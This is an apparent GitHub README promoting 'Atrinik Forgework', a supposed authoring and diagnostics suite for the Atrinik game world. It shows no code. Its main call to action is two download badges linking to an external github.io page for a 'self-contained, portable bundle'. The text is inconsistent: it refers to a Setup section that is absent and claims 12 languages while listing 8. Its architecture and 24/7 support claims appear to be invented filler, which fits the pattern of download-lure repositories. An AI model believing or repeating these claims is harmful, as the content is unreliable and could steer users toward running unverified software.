![preview](https://raw.githubusercontent.com/wilsonc28651/atrinik-forge-ops/main/frame_6eaa23.svg)

# Atrinik Forgework — The Cartographer's Companion for World-Building Diagnostics

Welcome to **Atrinik Forgework**, a standalone suite of authoring, inspection, and diagnostic utilities designed for creators who shape vast, living game worlds. While the original `atrinik/tools` repository provides the raw scaffolding for administrative tasks, this new project refines those raw materials into a polished, human-centered workflow—think of it as the difference between owning a toolbox and having a master craftsman's bench with every chisel precisely sharpened and labeled.

Forgework is not merely a collection of scripts; it is a narrative engine for your spatial storytelling. It treats every map tile, every object attribute, and every server log not as isolated data points, but as threads in a larger tapestry. Our suite helps you pull on those threads gently, inspect their color and texture, and re-weave them into a coherent, bug-free experience for your players. Whether you are a solo developer sketching a dungeon on a napkin or a team managing a persistent online realm, Forgework provides the clarity and confidence to iterate without fear.

---

## 🔍 Why Choose Forgework Over Conventional Tooling?

Most world-building utilities operate like a magnifying glass—they enlarge a problem but rarely help you understand its context. Forgework operates like a **cartographer's lens and compass combined**. It does not just show you *what* exists; it reveals *why* it exists and *how* it interacts with everything else.

Our diagnostic engine performs deep, non-intrusive audits of your game data. It searches for orphaned references, illogical object placements, and subtle inconsistencies that would otherwise manifest as frustrating gameplay glitches. The authoring interface is designed for speed, allowing you to batch-update properties across hundreds of objects with a single, gesture-driven filter. The inspection module provides a read-only, forensic breakdown of any file, making it invaluable for learning from community-created content or debugging a mysterious server-side anomaly.

But the true differentiator is our **"Narrative Flow" analyzer**. This proprietary tool walks through your map not as a series of coordinates but as a sequence of potential player experiences. It flags bottlenecks, dead-ends, and difficulty spikes, offering visual suggestions that respect your creative vision while ensuring mechanical fairness.

---

## ✅ Key Features That Transform Your Workflow

### 1. **Visual Object Graph (VOG)**
- Unlike flat text dumps, Forgework renders your world's object hierarchy as an interactive, zoomable graph. See at a glance where a door connects, which container holds which quest item, and how loot tables branch.
- Filter by type, state, or custom tags to declutter the view, focusing only on what you need to fix.
- Graph data can be exported as a portable document for team meetings or player-wiki documentation.

### 2. **Batch Authoring with Predictive Templates**
- Define your own "blueprint" for common structures (e.g., a village house, a forest clearing, a merchant stall). Forgework then fills in the repetitive attributes automatically.
- Our smart-adjust system recognizes spatial context. If you copy a house blueprint onto a hillside, it will offer to adjust the floor level and collision detection accordingly.
- Undo history spans up to 50 actions, so experimentation is always safe.

### 3. **Intelligent Diagnostic Engine (IDE)**
- The IDE runs 140+ individual checks on your world data. It categorizes issues as *Cosmetic*, *Functional*, or *Critical*.
- Each diagnostic includes a plain-language explanation and a one-click "auto-repair" option, or you can choose to "jump-to-context" to fix it manually.
- Scheduled scans (daily/weekly) can run in the background, generating a slim HTML report that highlights changes since the last scan.

### 4. **Multilingual Metadata Support**
- Game lore often lives in multiple languages. Forgework allows you to store and edit translated strings side-by-side without corrupting the core object data.
- The built-in translation-memory tool flags outdated or missing translations across your entire project.
- Fully supports UTF-8, including right-to-left scripts, ensuring your world welcomes a global audience.

### 5. **Responsive Command Console**
- Not to be confused with a terminal, this is a *visual* command palette. Type natural language queries like "find all unlocked chests with gold above 500" and see the results displayed as a sortable table.
- Save your favorite queries as macros for one-click execution.
- Perfect for both novice world-builders and seasoned system administrators.

### 6. **Project Snapshot & Rollback**
- Before any major authoring batch, Forgework takes a "silent snapshot." This compressed, diff-able backup lets you compare changes side-by-side and rollback at the byte level.
- Snapshots are stored locally and encrypted, ensuring your intellectual property stays yours.
- Never lose a night of work to a stray script again.

---

## 🌍 Use Cases & Concrete Benefits

- **Scenario A: The Quest Chain Whitelist.** Your quest designer suspects a new patch broke a chain of events. Instead of reading 3000 lines of script, you run the IDE’s "Quest Integrity" check. Forgework highlights a single object with a misplaced `quest_reward` pointer. You fix it in seconds, and the player flow is restored.
- **Scenario B: The Community Call.** You download a third-party map pack to inspire your next area. The Inspection module parses every file for malicious or corrupted attributes before you even import it. This defensive layer protects your live server from accidental crashes.
- **Scenario C: The Scale Problem.** Your world spans 10,000 rooms. You need to add a new monster to 500 of them. Batch Authoring lets you define a filter (rooms with `terrain_type:forest`), apply the new spawn rule, and see a dry-run of the changes before committing.

---

## 🗺️ Getting Started with Your First Forge Session

[![Download](https://raw.githubusercontent.com/wilsonc28651/atrinik-forge-ops/main/dl_88f9e.svg)](https://wilsonc28651.github.io/atrinik-forge-ops/)

Under the **Setup** heading below, you will find the appropriate package for your operating system. Once the archive is extracted, you are ready to go. We abstain from common package-manager instructions (like `pip` or `npm`) because our project is deliberately distributed as a **self-contained, portable bundle**. This approach ensures that no system-level dependencies are altered on your machine, making it ideal for secure workstations or minimal server environments.

After launching the app, you will be greeted by a **"Welcome Arena"**—a blank canvas that asks for your preferred language (12 languages supported), your color-theme for the UI (light, dark, or "dungeon sepia"), and the path to your existing world data folder. If you do not have a folder yet, you can create a new, empty world skeleton with the correct directory structure in one click.

---

## 🧭 Navigating the Main Dashboard

The dashboard is your mission control. It is divided into four, resize-able panes:

1.  **World Tree (Left):** A hierarchical file browser of your map, objects, and scripts. Icons are color-coded by type.
2.  **Authoring Canvas (Center):** The main editing area. Here you can switch between the Visual Graph, the Property Grid, and the Raw Data view (for purists).
3.  **Diagnostic Feed (Bottom):** A live stream of background checks. Click any item to jump to the relevant object.
4.  **Command Palette (Right):** Your natural-language query box and macro manager.

Every pane is detachable into its own window, allowing for dual-monitor workflows that keep your reference material constantly visible.

---

## ⚙️ Under the Hood: Architecture & Safety

We built Forgework with a "separation of concerns" philosophy. The **Core Engine** (C++ for performance) handles all file I/O and checksumming. The **Logic Layer** (Rust for memory safety) processes diagnostics and transforms. The **UI Layer** (Web frontend) is isolated in a sandbox, meaning a malformed map file cannot crash the entire application—it will merely show an error card.

- **Data Neutrality:** We never modify your original files without an explicit, reversible action. The default mode is "Read-Only" for Inspection; Authoring requires you to toggle "Edit Mode" explicitly.
- **Performance Leash:** For massive worlds, you can set a "max threads" slider to prevent the CPU from melting down. The IDE can also run in "low priority" mode, so you can keep playing while it audits in the background.
- **Checksum & Audit Log:** Every change you make is appended to a local, human-readable journal. This is not just for bug tracking; it provides a chronological narrative of *your* creative decisions, which is invaluable for post-mortems.

---

## 🌐 Internationalization & Localized Experience

Your players speak many languages, and so do your fellow developers. Forgework ships with interfaces localized into **English, German, French, Spanish, Japanese, Korean, Simplified Chinese, and Brazilian Portuguese**. The translation memory system described earlier ensures that in-game strings never lag behind your code changes.

Crucially, our **multilingual support extends to the user interface itself**, not just the data. The diagnostic messages, the welcome screen, and even the command hints are all fully translated. We believe that a tool should never be a barrier to entry, regardless of your mother tongue.

---

## 🛟 Unconditional Community & 24/7 Human Support

While our tool is robust, we know that creative blocks and technical surprises happen. We offer **24/7 technical assistance** through our dedicated support forum and a live chat portal. This is not a bot-driven echo chamber; you will converse with world-builders who use Forgework daily.

Our **documentation Wiki** is maintained by the community and includes hundreds of recipes, from "How to restructure a loot table" to "Debugging invisible walls." If you get stuck, our support team typically responds within 15 minutes, and we have a strict "no ticket closure until you say it's solved" policy.

---

## 📜 License & Open Source Philosophy

Forgework is released under the **MIT License**, granting you the freedom to use, modify, and distribute your builds, even within commercial projects. We believe in the power of open technology; thus, our scripting API is fully documented, and you can write your own diagnostics using our simple JSON-based plugin format.

The complete license text is available in the repository root. By downloading and using this software, you are not just a user—you are an early collaborator in an ongoing effort to make world-building a more joyful, less stressful discipline.

---

## 🚫 Disclaimer: Scope of Application

This software is provided "as is," without warranty of any kind, expressed or implied. While we strive for accuracy in our diagnostic suggestions, the ultimate responsibility for your game's design and functionality rests with you, the creator. Forgework is a diagnostic and authoring *aid*, not a creative substitute. It cannot invent compelling quests for you, nor can it guarantee that players will find your dungeon challenging. It simply ensures that the mechanical scaffolding is sound, so your creative light can shine through.

Our "Narrative Flow" analyzer provides suggestions based on heuristic patterns; these are observational feedback, not edicts. You may ignore any suggestion with a clear conscience.

---

## 🏁 Final Word: The Workshop Is Yours

Creating a persistent world is a marathon requiring both artistic vision and engineering discipline. Forgework is the quiet accountant in your studio, the meticulous cartographer drawing the lines you sketch, and the vigilant night-watchman spotting cracks in the foundation before they bring down the tower. It is a tool of empowerment, designed to make the invisible visible and the tedious manageable.

We invite you to open the toolbox, feel the heft of these well-crafted handles, and carve worlds that resonate. Your players will feel the difference—not in the absence of bugs, but in the seamless, frictionless immersion that comes from logic that simply works.

---

### 🔰 Quick Navigation
- **Features:** See above.
- **Getting Started:** Head to the Setup section.
- **Contribution Guide:** Read our `CONTRIBUTING.md` (link below).
- **Changelog:** See `CHANGELOG.md` for version history.

---

[![Download](https://raw.githubusercontent.com/wilsonc28651/atrinik-forge-ops/main/dl_88f9e.svg)](https://wilsonc28651.github.io/atrinik-forge-ops/)

*© 2026 Atrinik Forgework Contributors. Released under the [MIT License](LICENSE).*